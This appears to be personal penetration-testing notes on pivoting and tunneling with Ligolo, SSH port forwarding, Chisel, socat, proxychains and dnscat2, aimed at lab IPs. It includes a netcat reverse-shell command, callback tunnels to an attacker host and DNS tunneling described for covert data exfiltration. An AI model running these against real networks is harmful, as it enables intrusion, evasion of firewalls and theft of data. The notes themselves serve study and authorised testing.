## Port Tunneling & Redirection

#### Ligolo

Think of it as disguising your machine as the pivot machine in the eyes of the firewall. Favorite for tunnelling.

Scenarios.
- Use a service that is only available on the localhost of the target like RDP or web server.
- Transfer files from internal (through pivot) to attacker and vise versa.


```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.201.0/24 dev ligolo # Discard 4th octect of victim machine's internal ip
ip route list
sudo ligolo-proxy -selfcert

./agent -connect 192.168.45.221:11601 -ignore-cert -retry # Target

session # select the session that you want to work with
1
start
listener_add --addr 0.0.0.0:3389 --to 127.0.0.1:3389
listener-list # confirm

.\nc.exe 172.16.157.14 1234 -e cmd.exe # On target machine to receive revshell
# If web server, access browser and/or direct attacks to localhost:port

# Great for transferring files when testing AD
listener_add --addr 0.0.0.0:1433 --to 172.10.121.15:1433 # If you need to use specific port for internal
```

You may need to create certificates:

```bash
mkdir -p ~/Downloads/certs
cd ~/Downloads/certs
openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
```

#### Local Forwarding

Binding local ports to dmz ones and using your local machine to act as the (accessible) remote machine.

#### Local Port Forwarding

Local port forwarding allows you to forward a port on the local machine to a remote server. This is useful for accessing a remote service as if it were running on your local machine.
- Access an internal database via a pivot machine, bypassing rules against direct external connections.
- Connect to an email server's local-only management interface, circumventing local access restrictions.
- Reach a DMZ server without direct connections, navigating DMZ-specific ingress rules.
- Bypass firewall blocks on remote ports to access restricted services.
- Transfer files to a non-directly accessible server, overcoming remote file transfer blocks.

Access remote HTTPS website that's on port 443.

```bash
ssh -N -L localhost:localPort:destinationServer:remotePort user@SSHserver
ssh -N -L 127.0.0.1:443:127.0.0.1:8443 web_admin@10.4.50.215
ssh -N -L 9000:localhost:8000 -i 245/id_ecdsa anita@192.168.196.246 -p 2222
```

Upload files to remote.

```bash
ssh -N -L 9000:dmz_ip:22 user@dmz_ip
scp -P 9000 local_backup_file.tar.gz localhost:/path/to/destination/
```

Download files from remote.

```bash
ssh -L 9001:internal_server:22 user@pivot_machine # Download files from remote
scp -P 9001 localhost:/path/to/config_file.conf /local/path/ 
```


### Local Dynamic Port Forwarding

Allows you to create a SOCKS proxy server on the local machine, which can be used to forward requests dynamically to multiple destinations.

- Use the dynamic port forwarding to scan multiple ports on a target network without setting up individual port forwards for each.
- Access multiple services on different ports and different servers through a single local SOCKS proxy.

```bash
ssh -fND 0.0.0.0:9999 database_admin@10.4.50.215
socks4 127.0.0.1 9999 # Edit /etc/proxychains4.conf
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

```bash
chisel server --reverse --port 51234 # Attacker, make sure this port is open in the firewall
/tmp/chisel client kali_ip:51234 50080:socks
```

#### Remote Forwarding

Using a pivot machine as a middle man.

Scenarios.
- Internal AD environment is shut off to you, use your compromised machine as a pivot to dig further.
- Transfer files from internal to attacker through pivot.

#### Remote Port Forwarding

Remote port forwarding allows you to forward a port on the remote server to a local machine. This is useful for exposing local services to a remote network.

- Expose an internal web server via a remote pivot.
- Strict firewall egress doesn't allow traffic in or out of 1433 outside of the network.
- Provide remote access to a local file server, overcoming local network file access restrictions.

```bash
chisel server --reverse --port 5000
/tmp/chisel client kali_ip:5000 R:443:127.0.0.1:443 R:8443:127.0.01:8443
curl localhost:8443 # On attacker machine
```

```bash
ssh -N -R remotePort:localServer:localPort kali@$myip # On pivot machine
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
psql -h 127.0.0.1 -p 2345 -U postgres # Now access PostgreSQL via Local Port
```

Upload files to internal.

```bash
ssh -R 9002:localhost:22 user@internal_ip # Execute commands on pivot machine
scp -P 9002 update_package.zip internal_user@localhost:/path/to/internal_folder/
```

### Remote Dynamic Port Forwarding

Remote dynamic port forwarding allows setting up a SOCKS proxy on a remote server to dynamically forward traffic from the remote server to multiple destinations.

- Internal AD environment is shut off to you, use your compromised machine as a pivot to dig further.
- Access services across remote networks, bypassing direct internet exposure rules.
- Perform network monitoring from afar, avoiding restrictions on external monitoring tools.

```bash
ssh -N -R remotePort:localServer:localPort kali@$myip # On pivot machine
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
psql -h 127.0.0.1 -p 2345 -U postgres # Now access PostgreSQL via Local Port
```

### Chisel

Scenarios.
- You compromised Confluence server, but only HTTP outbound traffic is allowed.
- A network administrator blocks all outbound SSH traffic, affecting SSH-based tunneling strategies.

Troubleshooting.
- Make sure versions are compatible.
- Ensure ip addresses are in the right locations

Using target's service that's only available on their localhost.

```bash
chisel server --reverse --port 51234 # Attacker
./chisel client $myip:51234 R:8443:127.0.0.1:8443 # Target
```

Masquerading as HTTP traffic.

```bash
chisel server --reverse --socks5 -p 8001 &> /tmp/output 
chisel server --port 8080 --reverse &> /tmp/output # For TCP Traffic

./chisel client 192.168.45.221:8001 R:socks # Client

socks5 127.0.0.1 8001 # sudo vi /etc/proxychains5.conf
proxychains ...
```

```bash
/tmp/chisel server --reverse --port 51234
/tmp/chisel client kali_ip:51234 R:50080:socks
```

### Port Redirection with Socat

Scenario.
- Redirect traffic from an external-facing port to an internal service.

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 # Victim
ssh database_admin@192.168.50.63 -p2222
```

### Using Browser with Proxychains

Configure Proxychains

```bash
socks4 127.0.0.1 9050 # Edit /etc/proxychains.conf
proxychains firefox
```

### DNS Tunneling

Scenarios.
- Sending data out of a network covertly via DNS queries.
- Sending data into a network covertly via DNS responses.

#### Basic Usage

```bash
dnscat2-server <YOUR_DOMAIN> # Attacker
./dnscat <YOUR_DOMAIN> # Target
```

#### Network Monitoring

```bash
tcpdump -i eth0 'tcp port 80' # Monitor HTTP Traffic
tcpdump -i eth0 'udp port 53' # Monitor DNS Queries
```

#### Resourcess

[Ligolo](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
[Port Forwarding](https://github.com/twelvesec/port-forwarding)